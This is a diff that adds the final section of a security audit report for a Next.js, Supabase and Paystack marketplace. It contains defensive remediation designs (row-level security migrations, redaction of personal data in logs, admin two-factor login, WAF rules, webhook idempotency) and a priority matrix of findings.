+    // utils/platform/ranking-signals.js
+    export async function recordRankingSignal(adminClient, { productId, eventType, userId, metadata }) {
+      // Validate eventType against server-side allowlist
+      const ALLOWED = new Set(['product_view', 'add_to_cart', 'order_placed', 'wishlist_add']);
+      if (!ALLOWED.has(eventType)) return;
+      // Write to product_events using service-role client
+      await adminClient.from('product_events').insert({ ... });
+    }
+
+  This function is called from:
+    • Server Components (Next.js RSC) when a product page renders
+    • Server Actions when add-to-cart or wishlist actions fire
+    • Paystack webhook handler (already in place)
+
+  Client-side /api/analytics/events receives browser events for dashboard
+  display only and is explicitly blocked from writing to product_events.
+
+Migration required:
+  ALTER TABLE public.product_events ENABLE ROW LEVEL SECURITY;
+  -- Remove any existing insert policy for anon/authenticated:
+  DROP POLICY IF EXISTS product_events_ingest_insert ON public.product_events;
+  -- No replacement policy: only service-role (which bypasses RLS) can insert.
+
+Files to create/modify:
+  • utils/platform/ranking-signals.js  (new)
+  • app/api/analytics/events/route.js  (remove product_events write path if any)
+  • supabase/migrations/YYYYMMDD_ranking_signal_isolation.sql (new migration)
+
+────────────────────────────────────────────────────────────────────────────────
+PLAN B — Structured PII Masking in writeActivityLog
+────────────────────────────────────────────────────────────────────────────────
+
+Problem:
+  Each call site to writeActivityLog decides what goes in metadata. Sensitive
+  fields (phone numbers, addresses) are occasionally included by mistake because
+  there is no enforcement. The fix should be structural, not ad-hoc.
+
+Design:
+  Introduce a PII-aware metadata sanitiser inside writeActivityLog itself.
+  Define a PII_FIELDS blocklist that is stripped from metadata at write time,
+  regardless of what the caller passes.
+
+  Implementation in utils/telemetry/server.js (or wherever writeActivityLog lives):
+
+    // Fields that must never appear in any log entry's metadata
+    const PII_FIELDS = new Set([
+      'phone', 'phone_number', 'address', 'address_line1', 'address_line2',
+      'street', 'postalCode', 'postal_code', 'deliveryAddress', 'delivery_address',
+      'email',      // user_id is the identifier; email is PII
+      'full_name',  // user_id joins to profile; name is PII
+      'card_number', 'cvv', 'bank_account',
+    ]);
+
+    function sanitizeMetadata(metadata) {
+      if (!metadata || typeof metadata !== 'object') return metadata;
+      const clean = { ...metadata };
+      for (const field of PII_FIELDS) {
+        if (field in clean) {
+          clean[field] = '[REDACTED]';
+        }
+      }
+      // Recurse one level for nested objects (e.g., deliveryAddress as object)
+      for (const [key, value] of Object.entries(clean)) {
+        if (value && typeof value === 'object' && !Array.isArray(value)) {
+          clean[key] = sanitizeMetadata(value);
+        }
+      }
+      return clean;
+    }
+
+    export async function writeActivityLog({ metadata, ...rest }) {
+      const safeMetadata = sanitizeMetadata(metadata);
+      // ... existing write logic using safeMetadata
+    }
+
+  This way, even if a future developer accidentally includes deliveryAddress
+  in a metadata payload, it is automatically redacted before hitting the database.
+
+  Traceability note: user_id is a top-level column in activity_logs (not in
+  metadata). It is already stored separately and is NOT affected by sanitisation.
+  Investigators join user_id → users table for identity context.
+
+Files to modify:
+  • utils/telemetry/server.js  (add sanitizeMetadata, apply in writeActivityLog)
+
+────────────────────────────────────────────────────────────────────────────────
+PLAN C — WAF Layer for Admin and Store Console Routes
+────────────────────────────────────────────────────────────────────────────────
+
+Problem:
+  Admin (/admin/*) and store console (/store/*) routes have no network-level
+  protection beyond application auth checks. A compromised credential or
+  auth bypass directly reaches the application.
+
+Design:
+  Cloudflare WAF rules (configured in the Cloudflare dashboard, not in code):
+
+  Rule 1 — Admin IP Allowlist
+    Expression: (http.request.uri.path matches "^/admin") and
+                not (ip.src in {YOUR_OFFICE_IP YOUR_VPN_IP})
+    Action: Block (or Challenge if using known-bot scoring)
+
+  Rule 2 — Bot Score Threshold on Checkout
+    Expression: (http.request.uri.path eq "/api/checkout") and
+                (cf.bot_management.score lt 30)
+    Action: Managed Challenge
+
+  Rule 3 — Rate Limit at Edge (backup for Redis failure)
+    Expression: (http.request.uri.path matches "^/api/auth") or
+                (http.request.uri.path matches "^/api/store")
+    Rate limit: 100 requests per 60 seconds per IP
+    Action: Block for 60 seconds
+    (This is Cloudflare's rate limiting product, separate from WAF rules)
+
+  Rule 4 — Geo-restriction on Admin (optional, reduce attack surface)
+    Expression: (http.request.uri.path matches "^/admin") and
+                not (ip.geoip.country in {"NG"})
+    Action: Block (restrict admin access to Nigeria only, adjust as needed)
+
+  Application-code change (defence-in-depth):
+    In proxy.js, add a custom header check for admin routes:
+      if (request.nextUrl.pathname.startsWith('/admin')) {
+        const cfScore = request.headers.get('cf-bot-management-score');
+        if (cfScore && parseInt(cfScore) < 30) {
+          return NextResponse.json({ error: 'Access denied' }, { status: 403 });
+        }
+      }
+
+Files to create/modify:
+  • proxy.js  (add bot-score header check for /admin)
+  • Cloudflare dashboard configuration (not a code file — documented in
+    documentation/security/cloudflare-waf-rules.md — to be created)
+
+────────────────────────────────────────────────────────────────────────────────
+PLAN D — Mandatory 2FA for Admin Accounts via Supabase TOTP
+────────────────────────────────────────────────────────────────────────────────
+
+Problem:
+  Admin accounts have no second factor. A single leaked password gives full
+  platform access. Admin compromise is a complete platform breach.
+
+Design:
+  Use Supabase's built-in MFA API (supabase.auth.mfa.*) to enforce TOTP.
+
+  Enrolment flow (admin setup page):
+    1. Call supabase.auth.mfa.enroll({ factorType: 'totp' })
+       → Returns { id: factorId, totp: { qr_code, secret, uri } }
+    2. Show QR code to admin using a <QRCode> component
+    3. Admin scans with authenticator app (Google Authenticator, Authy)
+    4. Admin enters the 6-digit code to verify enrolment:
+       await supabase.auth.mfa.challengeAndVerify({ factorId, code })
+    5. On success, set a flag in admin_users: mfa_enrolled = true
+
+  Login enforcement in requireAdminApi():
+    After verifying membership, check AAL (Assurance Level):
+      const { data: { session } } = await authClient.auth.getSession();
+      const aal = session?.user?.factors?.length > 0
+        ? session.aal
+        : 'aal1';
+      if (aal !== 'aal2') {
+        return {
+          ok: false,
+          response: NextResponse.json(
+            { error: 'Two-factor authentication required for admin access', require_mfa: true },
+            { status: 403 }
+          ),
+        };
+      }
+
+  Frontend MFA challenge component (for admin login flow):
+    When API returns { require_mfa: true }:
+    1. Call supabase.auth.mfa.listFactors() to get enrolled factors
+    2. Call supabase.auth.mfa.challenge({ factorId }) → returns challengeId
+    3. Prompt admin for 6-digit TOTP code
+    4. Call supabase.auth.mfa.verify({ factorId, challengeId, code })
+    5. On success, session is upgraded to AAL2; retry the original request
+
+  Database migration:
+    ALTER TABLE public.admin_users
+      ADD COLUMN IF NOT EXISTS mfa_enrolled boolean NOT NULL DEFAULT false,
+      ADD COLUMN IF NOT EXISTS mfa_enrolled_at timestamptz NULL;
+
+  Files to create/modify:
+    • utils/admin/auth.js  (add AAL2 check in requireAdminApi)
+    • app/(admin)/admin/mfa-setup/page.js  (new TOTP enrolment page)
+    • components/admin/MfaChallengeModal.jsx  (new TOTP prompt modal)
+    • supabase/migrations/YYYYMMDD_admin_mfa.sql  (new migration)
+
+  Note on scope: Store owners are not covered in this plan. The decision
+  to extend 2FA to store owners is a separate product decision. The
+  infrastructure (Supabase MFA) supports it with the same pattern.
+
+────────────────────────────────────────────────────────────────────────────────
+PLAN E — RLS for analytics_events Table
+────────────────────────────────────────────────────────────────────────────────
+
+Problem:
+  analytics_events has no RLS. Any authenticated user can SELECT all rows,
+  revealing platform-wide user behaviour data.
+
+Design:
+  Enable RLS with a deny-all policy (no SELECT for non-service-role).
+  All reads of analytics_events already go through server-side routes that
+  use the admin client (service role bypasses RLS), so this change has zero
+  functional impact on existing functionality.
+
+  Migration:
+    -- Enable RLS (deny all non-service-role access by default)
+    ALTER TABLE public.analytics_events ENABLE ROW LEVEL SECURITY;
+    -- No policies: service-role (admin client) bypasses RLS automatically.
+    -- All reads via server routes already use adminClient.
+
+  Verify after applying:
+    Run as anon role: SELECT * FROM analytics_events LIMIT 1;
+    Expected result: 0 rows (or permission denied, depending on Supabase version)
+
+  Files to create:
+    • supabase/migrations/YYYYMMDD_analytics_events_rls.sql  (new migration)
+
+────────────────────────────────────────────────────────────────────────────────
+PLAN F — Idempotency Keys for Payment Webhook (Unique Constraint)
+────────────────────────────────────────────────────────────────────────────────
+
+Problem:
+  orders.payment_reference has no UNIQUE constraint. Concurrent duplicate
+  webhooks from Paystack can both complete the same order, resulting in double
+  escrow funding (see Finding 007).
+
+Design:
+  Add a partial unique index that prevents two non-NULL payment references
+  from being assigned to different order rows, and prevents a single order
+  from being completed twice with the same reference.
+
+  Migration (to add to supabase/migrations/):
+    -- Prevent duplicate payment references across orders
+    CREATE UNIQUE INDEX IF NOT EXISTS orders_payment_reference_unique_idx
+      ON public.orders (payment_reference)
+      WHERE payment_reference IS NOT NULL;
+
+    -- Optional: add a named constraint for clearer error messages
+    -- (Can't do ADD CONSTRAINT with a WHERE clause in Postgres;
+    --  the unique index above is the correct approach)
+
+  Application-level change:
+  The existing webhook handler already does:
+    .eq('status', 'pending')
+    .is('payment_reference', null)
+  This remains as the first line of defence. The DB constraint is the
+  absolute backstop that prevents double-completion even under concurrency.
+
+  When the unique constraint is violated, Supabase returns error code 23505.
+  The webhook handler should recognise this and return 200 OK (not 500):
+
+    if (updateError?.code === '23505') {
+      // Duplicate reference: order already completed by concurrent request.
+      return NextResponse.json({ success: true, message: 'Already processed' });
+    }
+
+  Files to create/modify:
+    • supabase/migrations/YYYYMMDD_orders_payment_reference_unique.sql  (new)
+    • app/api/paystack/webhook/route.js  (handle 23505 gracefully)
+
+
+================================================================================
+  SECTION 6 — REMEDIATION PRIORITY MATRIX
+================================================================================
+
+  Priority   Finding   Title                                        Effort
+  ─────────────────────────────────────────────────────────────────────────
+  P0 NOW     002       Rate limiting fails completely open          Medium
+  P0 NOW     007       payment_reference lacks UNIQUE constraint    Low (SQL)
+  P0 NOW     004       PII (address/phone) in activity logs         Low
+  P0 NOW     009       Inventory history fetches 200 global rows    Low
+  ─────────────────────────────────────────────────────────────────────────
+  P1 SPRINT  001       CSP is Report-Only / unsafe-inline           High
+  P1 SPRINT  003       Open redirect via X-Forwarded-Host           Low
+  P1 SPRINT  005       IP spoofing bypasses rate limit IP dim.      Low
+  P1 SPRINT  008       analytics_events has no RLS                  Low (SQL)
+  P1 SPRINT  013       Middleware doesn't guard /store /admin       Low
+  ─────────────────────────────────────────────────────────────────────────
+  P2 NEXT    006 / A   Analytics feeds ranking directly    [PLAN A]  High
+  P2 NEXT    004 / B   Structured PII masking in logs      [PLAN B]  Low
+  P2 NEXT    D         Admin mandatory 2FA                 [PLAN D]  High
+  P2 NEXT    F         Webhook idempotency (DB level)      [PLAN F]  Low
+  ─────────────────────────────────────────────────────────────────────────
+  P3 LATER   C         WAF layer (Cloudflare rules)        [PLAN C]  Medium
+  P3 LATER   010       Error strings leak schema                     Low
+  P3 LATER   011       Checkout leaks RPC error details              Low
+  P3 LATER   012       Review verify: no user-scope JOIN             Medium
+  P3 LATER   014       Deprecated auth-helpers-nextjs                Low
+  P3 LATER   015       ioredis + @upstash/redis both present         Low
+  P3 LATER   016       requireAdminApi() no roles on GETs            Low
+  ─────────────────────────────────────────────────────────────────────────
+
+================================================================================
+  END OF REPORT
+================================================================================
+  Document: documentation/reports/security-audit-2026-04-27.txt
+  Next step: Implement fixes in priority order above. Start with P0 items
+             (no migration risk, immediate security value) then P1.
+             Architectural plans (A–F) require design review before sprinting.
+================================================================================
